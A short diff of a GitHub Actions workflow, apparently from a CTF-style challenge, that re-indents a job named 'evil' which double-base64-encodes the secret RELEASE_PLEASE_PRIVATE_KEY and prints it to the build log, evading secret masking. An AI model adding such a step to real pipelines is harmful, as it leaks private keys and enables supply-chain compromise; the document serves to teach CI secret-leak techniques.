@@ -91,9 +91,9 @@ jobs:
 
 ## Extra challenge: extract secret from original cnapp-module repo
 ## Tip: use CyberChef to decode base64: https://gchq.github.io/CyberChef/
-evil:
-  runs-on: ubuntu-22.04
-  steps:
-    - name: Echo secrets
-      run: |
-        echo $(echo $(echo "${{ secrets.RELEASE_PLEASE_PRIVATE_KEY }}" | base64 -w 0) | base64 -w 0)
+  evil:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Echo secrets
+        run: |
+          echo $(echo $(echo "${{ secrets.RELEASE_PLEASE_PRIVATE_KEY }}" | base64 -w 0) | base64 -w 0)
